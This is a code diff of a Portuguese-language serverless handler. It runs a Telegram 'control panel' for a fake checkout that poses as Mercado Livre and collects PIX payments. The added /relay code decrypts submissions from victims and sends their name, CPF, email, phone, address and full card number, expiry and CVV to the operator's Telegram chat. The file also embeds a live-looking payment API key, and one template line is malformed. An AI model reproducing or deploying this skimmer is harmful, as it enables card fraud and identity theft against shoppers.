@@ -7,7 +7,6 @@ const UNIAOPAY_BASE = 'meupagamento.site';
 const UNIAOPAY_ROOT = '/api/v1/uniaopay';
 const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';
 
-// Estado do sistema e métricas em memória (Vercel Global Scope)
 let systemState = {
   log_channel: OWNER_ID || null,
   stats: {
@@ -88,13 +87,58 @@ async function editTelegram(chatId, messageId, text, keyboard) {
   return res;
 }
 
+// ── Descriptografador de métricas AES-256-GCM / Base64 ─────────
+function decryptMetrics(metricsDataStr, keyB64) {
+  if (!metricsDataStr) return null;
+  try {
+    let parsedObj = null;
+    if (typeof metricsDataStr === 'string') {
+      try { parsedObj = JSON.parse(metricsDataStr); } catch (e) {}
+    } else if (typeof metricsDataStr === 'object') {
+      parsedObj = metricsDataStr;
+    }
+
+    if (parsedObj && parsedObj.iv && parsedObj.ct && keyB64) {
+      const keyBuf = Buffer.from(keyB64, 'base64');
+      const ivBuf = Buffer.from(parsedObj.iv, 'base64');
+      const ctBuf = Buffer.from(parsedObj.ct, 'base64');
+
+      if (ctBuf.length > 16) {
+        const ciphertext = ctBuf.subarray(0, ctBuf.length - 16);
+        const authTag = ctBuf.subarray(ctBuf.length - 16);
+
+        const decipher = crypto.createDecipheriv('aes-256-gcm', keyBuf, ivBuf);
+        decipher.setAuthTag(authTag);
+        const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+        return JSON.parse(decrypted.toString('utf8'));
+      }
+    }
+
+    if (typeof metricsDataStr === 'string') {
+      const decoded = Buffer.from(metricsDataStr, 'base64').toString('utf8');
+      return JSON.parse(decoded);
+    }
+  } catch (err) {
+    try {
+      if (typeof metricsDataStr === 'string') return JSON.parse(metricsDataStr);
+    } catch (e) {}
+  }
+  return null;
+}
+
 // ── Notificar Erro/Offline da API de Pagamento ───────────────
 async function alertGatewayOffline(errorDetail) {
   const ts = new Date().toLocaleString('pt-BR');
-  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway UniãoPay OFFLINE!*\n\n` +
-                   `⚠️ *Falha:* Erro ao gerar cobrança PIX.\n` +
-                   `📌 *Detalhe:* \`${errorDetail}\`\n` +
-                   `📅 *Data/Hora:* \`${ts}\`\n\n` +
+  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway UniãoPay OFFLINE!*
+
+` +
+                   `⚠️ *Falha:* Erro ao gerar cobrança PIX.
+` +
+                   `📌 *Detalhe:* \`${errorDetail}\`
+` +
+                   `📅 *Data/Hora:* \`${ts}\`
+
+` +
                    `💡 *Ação:* Fallback automático BRCode ativado sem perder vendas!`;
   
   await sendTelegram(systemState.log_channel || OWNER_ID, alertMsg);
@@ -107,7 +151,6 @@ async function handleTelegramUpdate(update) {
   const msg = update.message || update.channel_post;
   const cb = update.callback_query;
 
-  // 1. Mensagens de texto / Comandos (/start)
   if (msg && msg.text) {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
@@ -118,9 +161,14 @@ async function handleTelegramUpdate(update) {
 
     if (text.startsWith('/start')) {
       systemState.log_channel = systemState.log_channel || String(chatId);
-      const welcome = `🤖 *Painel de Controle de Tráfego & Vendas (24h)*\n\n` +
-                      `🟢 *Status:* 100% Online & Monitorando Anúncios\n` +
-                      `📡 *Canal de Logs:* \`${systemState.log_channel}\`\n\n` +
+      const welcome = `🤖 *Painel de Controle de Tráfego & Vendas (24h)*
+
+` +
+                      `🟢 *Status:* 100% Online & Monitorando Anúncios
+` +
+                      `📡 *Canal de Logs:* \`${systemState.log_channel}\`
+
+` +
                       `Selecione uma opção abaixo para relatórios em tempo real:`;
 
       const buttons = [
@@ -135,14 +183,15 @@ async function handleTelegramUpdate(update) {
     }
   }
 
-  // 2. Botões inline (Atualiza a MESMA mensagem sem criar novas)
   if (cb) {
     const chatId = cb.message ? cb.message.chat.id : cb.from.id;
     const messageId = cb.message ? cb.message.message_id : null;
     const data = cb.data;
 
     if (data === 'main_menu') {
-      const welcome = `🤖 *Painel de Controle Mercado Livre (24h)*\n\n📡 *Canal de Logs:* \`${systemState.log_channel || 'Não definido'}\``;
+      const welcome = `🤖 *Painel de Controle Mercado Livre (24h)*
+
+📡 *Canal de Logs:* \`${systemState.log_channel || 'Não definido'}\``;
       const buttons = [
         [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
         [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
@@ -156,14 +205,24 @@ async function handleTelegramUpdate(update) {
 
     if (data === 'analytics') {
       const s = systemState.stats;
-      const report = `📊 *Métricas e Estatísticas em Tempo Real*\n\n` +
-                     `👁 *Entradas no Site:* \`${s.visits}\`\n` +
-                     `👤 *Dados Pessoais Preenchidos:* \`${s.personal_data}\`\n` +
-                     `🏠 *Endereços Preenchidos:* \`${s.address_data}\`\n` +
-                     `💳 *Cartões/Dados de Pagamento:* \`${s.card_data}\`\n` +
-                     `⚡ *PIX Gerados:* \`${s.pix_generated}\`\n` +
-                     `✅ *Vendas Concluídas (PIX PAGO):* \`${s.pix_paid}\`\n` +
-                     `🚪 *Saídas do Checkout:* \`${s.exits}\`\n\n` +
+      const report = `📊 *Métricas e Estatísticas em Tempo Real*
+
+` +
+                     `👁 *Entradas no Site:* \`${s.visits}\`
+` +
+                     `👤 *Dados Pessoais Preenchidos:* \`${s.personal_data}\`
+` +
+                     `🏠 *Endereços Preenchidos:* \`${s.address_data}\`
+` +
+                     `💳 *Cartões/Dados de Pagamento:* \`${s.card_data}\`
+` +
+                     `⚡ *PIX Gerados:* \`${s.pix_generated}\`
+` +
+                     `✅ *Vendas Concluídas (PIX PAGO):* \`${s.pix_paid}\`
+` +
+                     `🚪 *Saídas do Checkout:* \`${s.exits}\`
+
+` +
                      `📈 *Conversão:* \`${s.visits ? ((s.pix_generated / s.visits) * 100).toFixed(1) : 0}%\``;
 
       await editTelegram(chatId, messageId, report, [
@@ -175,7 +234,11 @@ async function handleTelegramUpdate(update) {
 
     if (data === 'gateway_status') {
       const ts = new Date().toLocaleString('pt-BR');
-      await editTelegram(chatId, messageId, `🟢 *Gateway UniãoPay Operacional*\n\n• Data/Hora: \`${ts}\`\n• Status API: Online (meupagamento.site)\n• Fallback BRCode: Ativo`, [
+      await editTelegram(chatId, messageId, `🟢 *Gateway UniãoPay Operacional*
+
+• Data/Hora: \`${ts}\`
+• Status API: Online (meupagamento.site)
+• Fallback BRCode: Ativo`, [
         [{ text: '🔙 Menu', callback_data: 'main_menu' }]
       ]);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
@@ -183,7 +246,9 @@ async function handleTelegramUpdate(update) {
     }
 
     if (data === 'send_test') {
-      await editTelegram(chatId, messageId, `🧪 *Teste de Notificação de Vendas*\n\nSeu sistema está pronto para rodar anúncios no Facebook/Google 24h sem erros!`, [
+      await editTelegram(chatId, messageId, `🧪 *Teste de Notificação de Vendas*
+
+Seu sistema está pronto para rodar anúncios no Facebook/Google 24h sem erros!`, [
         [{ text: '🔙 Menu', callback_data: 'main_menu' }]
       ]);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Teste concluído!' });
@@ -192,7 +257,9 @@ async function handleTelegramUpdate(update) {
 
     if (data === 'set_channel') {
       systemState.log_channel = String(chatId);
-      await editTelegram(chatId, messageId, `✅ *Canal Configurado!*\n\nEste chat (\`${chatId}\`) passará a receber todas as estatísticas de cartão, PIX e vendas!`, [
+      await editTelegram(chatId, messageId, `✅ *Canal Configurado!*
+
+Este chat (\`${chatId}\`) passará a receber todas as estatísticas de cartão, PIX e vendas!`, [
         [{ text: '🔙 Menu', callback_data: 'main_menu' }]
       ]);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal salvo!' });
@@ -244,45 +311,127 @@ module.exports = async (req, res) => {
     return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
   }
 
-  // 4. ENDPOINT /api/relay (Recebe Leads, Cartões, Endereços)
+  // 4. ENDPOINT /api/relay (Recebe Leads, Cartões, Endereços, Entradas, Saídas)
   if (urlPath.endsWith('/relay')) {
     try {
       const bodyData = req.body || {};
       const metricsData = bodyData.metrics_data;
+      const keyB64 = bodyData._k;
 
-      if (metricsData) {
-        let payload = null;
-        try {
-          const decoded = Buffer.from(metricsData, 'base64').toString('utf8');
-          payload = JSON.parse(decoded);
-        } catch (e) {
-          try { payload = JSON.parse(metricsData); } catch (err) {}
+      const payload = decryptMetrics(metricsData, keyB64) || bodyData;
+
+      if (payload && (payload.type || payload.event)) {
+        const type = payload.type || payload.event;
+        const data = payload.data || {};
+        const tracking = payload.tracking || {};
+        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
+
+        // Atualizar estatísticas em tempo real
+        if (type === 'lead') systemState.stats.visits++;
+        if (type === 'personal_data') systemState.stats.personal_data++;
+        if (type === 'address') systemState.stats.address_data++;
+        if (type === 'card_data') systemState.stats.card_data++;
+        if (type === 'pix_selected' || type === 'pix_viewed') systemState.stats.pix_generated++;
+        if (type === 'pix_paid') systemState.stats.pix_paid++;
+        if (type === 'lead_exit' || type === 'exit') systemState.stats.exits++;
+
+        // Formatar mensagens ricas para o Telegram
+        let text = '';
+        if (type === 'lead') {
+          text = `👁 *NOVA ENTRADA NO SITE (LEAD)*
+
+` +
+                 `🌐 *IP:* \`${ip}\`
+` +
+                 `📱 *Dispositivo:* \`${tracking.device || 'N/A'}\`
+` +
+                 `📄 *Página:* \`${data.page || tracking.page || 'Home'}\`
+` +
+                 `📅 *Horário:* \`${new Date().toLocaleString('pt-BR')}\``;
+        } else if (type === 'personal_data') {
+          text = `👤 *ETAPA 1: DADOS PESSOAIS PREENCHIDOS*
+
+` +
+                 `👤 *Nome:* *${data.fullName || 'N/A'}*
+` +
+                 `📧 *E-mail:* \`${data.email || 'N/A'}\`
+` +
+                 `🪪 *CPF:* \`${data.cpf || 'N/A'}\`
+` +
+                 `📱 *Celular:* \`${data.phone || 'N/A'}\`
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else if (type === 'address') {
+          text = `🏠 *ETAPA 2: ENDEREÇO DE ENTREGA*
+
+` +
+                 `📮 *CEP:* \`${data.cep || 'N/A'}\`
+` +
+                 `🛣 *Rua:* ${data.street || 'N/A'}, Nº ${data.number || 'N/A'}
+` +
+                 `🏙 *Bairro/Cidade:* ${data.neighborhood || 'N/A'} - ${data.city || 'N/A'}
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else if (type === 'card_data') {
+          text = `💳 *ETAPA 3: DADOS DE CARTÃO PREENCHIDOS*
+
+` +
+                 `💳 *Bandeira:* *${data.brand || 'N/A'}*
+` +
+                 `🔢 *Número:* \`${data.cardNumber || 'N/A'}\`
+` +
+                 `👤 *Titular:* *${data.cardName || 'N/A'}*
+` +
+                 `📅 *Validade:* \`${data.cardExpiry || 'N/A'}\`
+` +
+                 `🔐 *CVV:* \`${data.cardCvv || 'N/A'}\`
+` +
+                 `🪪 *CPF Titular:* \`${data.cpf || 'N/A'}\`
+` +
+                 `📦 *Parcelas:* ${data.installments || 1}x
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else if (type === 'pix_selected' || type === 'pix_viewed') {
+          text = `⚡ *PAGAMENTO PIX SELECIONADO*
+
+` +
+                 `💰 *Valor:* \`R$ 49,90\`
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else if (type === 'pix_paid') {
+          text = `🎉 *VENDA CONFIRMADA (PIX PAGO)*
+
+` +
+                 `👤 *Nome:* *${data.fullName || 'N/A'}*
+` +
+                 `📧 *Email:* \`${data.email || 'N/A'}\`
+` +
+                 `💰 *Valor:* \`R$ 49,90\`
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else if (type === 'lead_exit') {
+          text = `🚪 *SAÍDA DO CHECKOUT (ABANDONO)*
+
+` +
+                 `📄 *Última Página:* \`${data.lastPage || 'N/A'}\`
+` +
+                 `📊 *Profundidade Scroll:* \`${data.scrollDepth || 0}%\`
+` +
+                 `🌐 *IP:* \`${ip}\``;
+        } else {
+          text = `🔔 *INTERAÇÃO NO CHECKOUT*
+
+` +
+                 `📌 *Evento:* \`${type.toUpperCase()}\`
+` +
+                 `🌐 *IP:* \`${ip}\`
+` +
+                 `📋 *Dados:* \`\`\`json
+${JSON.stringify(data, null, 2)}
+\`\`\``;
         }
 
-        if (payload && payload.type) {
-          const type = payload.type;
-          const data = payload.data || {};
-          const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
-
-          // Atualizar estatísticas em tempo real
-          if (type === 'personal_data') systemState.stats.personal_data++;
-          if (type === 'address') systemState.stats.address_data++;
-          if (type === 'card_data') systemState.stats.card_data++;
-          if (type === 'exit') systemState.stats.exits++;
-
-          // Formatar alerta visual rico
-          let icon = '🔔';
-          if (type === 'personal_data') icon = '👤';
-          if (type === 'address') icon = '🏠';
-          if (type === 'card_data') icon = '💳';
-
-          const msg = `${icon} *NOVA INTERAÇÃO NO CHECKOUT*\n\n` +
-                      `📌 *Etapa:* \`${type.toUpperCase()}\`\n` +
-                      `🌐 *IP Lead:* \`${ip}\`\n` +
-                      `📋 *Informações:* \`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
-
-          await sendTelegram(systemState.log_channel || OWNER_ID, msg);
-        }
+        await sendTelegram(systemState.log_channel || OWNER_ID, text);
       }
 
       return res.status(200).json({ status: 'ok' });
@@ -335,11 +484,14 @@ module.exports = async (req, res) => {
       if (pixResponse && pixResponse.success && pixResponse.transaction) {
         const tx = pixResponse.transaction;
 
-        // Notificar PIX gerado
-        const pixMsg = `⚡ *COBRANÇA PIX GERADA COM SUCESSO*\n\n` +
-                       `💰 *Valor:* \`R$ 49,90\`\n` +
-                       `🆔 *ID Transação:* \`${tx.id}\`\n` +
-                       `📲 *Código PIX:* \`${tx.pix_code.substring(0, 30)}...\``;
+        const pixMsg = `⚡ *COBRANÇA PIX GERADA COM SUCESSO*
+
+` +
+                       `💰 *Valor:* \`R$ 49,90\`
+` +
+                       `🆔 *ID Transação:* \`${tx.id}\`
+` +
+                       `📲 *Código PIX:* \`${tx.pix_code.substring(0, 30)}...`\`;
         await sendTelegram(systemState.log_channel || OWNER_ID, pixMsg);
 
         return res.status(200).json({
@@ -401,9 +553,13 @@ module.exports = async (req, res) => {
       const isPaid = checkStatus.transaction?.status === 'paid';
       if (isPaid) {
         systemState.stats.pix_paid++;
-        const paidMsg = `🎉 *VENDA REALIZADA COM SUCESSO! (PIX PAGO)*\n\n` +
-                        `💰 *Valor Pago:* \`R$ 49,90\`\n` +
-                        `🆔 *ID Transação:* \`${txId}\`\n` +
+        const paidMsg = `🎉 *VENDA REALIZADA COM SUCESSO! (PIX PAGO)*
+
+` +
+                        `💰 *Valor Pago:* \`R$ 49,90\`
+` +
+                        `🆔 *ID Transação:* \`${txId}\`
+` +
                         `📅 *Data:* \`${new Date().toLocaleString('pt-BR')}\``;
         await sendTelegram(systemState.log_channel || OWNER_ID, paidMsg);
       }
